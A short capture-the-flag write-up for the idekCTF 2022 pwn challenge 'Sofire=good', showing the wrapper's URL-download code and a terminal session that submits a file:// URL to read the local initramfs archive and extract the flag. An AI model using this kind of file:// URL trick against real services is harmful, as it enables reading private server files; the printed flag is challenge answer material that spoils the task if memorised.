# Sofire=good - idekCTF 2022 (pwn, 7 solved, 497p)

## Introduction
Sofire=good is a pwn task.

An archive containing a kernel, a ram disk, source code and boilerplate code is
provided.

## Reverse engineering
The challenge first asks the user for a URL to fetch and download an exploit.

```python
# Downloading the user's exploit executable.
try:
    with urllib.request.urlopen(url) as f:
        exploit = f.read()
except Exception:
    print("Some error occurred while downloading your exploit executable. Try again or contact support :(\n")
    exit(-1)
else:
    # Saving the user's exploit executable to a tmp disk file.
    with open(path, "wb") as f:
        f.write(exploit)
```

Then, the virtual machine is started with the exploit in `/mnt`.

Very little time was spent trying to actually understand the challenge.

## Vulnerability
There is an unintended vulnerability in the wrapper script. By specifying a URL
starting with `file://`, it is possible to fetch local files in the virtual
machine.

## Exploitation
The exploitation of this unintended vulnerability is trivial. The
`/home/user/initramfs.cpio` file contains the flag.

```
% ncat --ssl sofirium-97f5551e54f58151.instancer.idek.team 1337
Give me the URL to your exploit executable (press enter to skip): file:///home/user/initramfs.cpio

[...]

/ $ cd /tmp/mount
cd /tmp/mount

/tmp/mount $ ls
ls
17d3c4bf-58a9-440e-84e7-59608c5e8380

/tmp/mount $ cpio -i flag.txt < 17d3c4bf-58a9-440e-84e7-59608c5e8380
cpio -i flag.txt < 17d3c4bf-58a9-440e-84e7-59608c5e8380
5788 blocks

/tmp/mount $ cat flag.txt
cat flag.txt
idek{n0N_r3fuNd48lE_tr@s#_0n_7h3_k3rn3l_(h41n}
```

**Flag**: `idek{n0N_r3fuNd48lE_tr@s#_0n_7h3_k3rn3l_(h41n}`
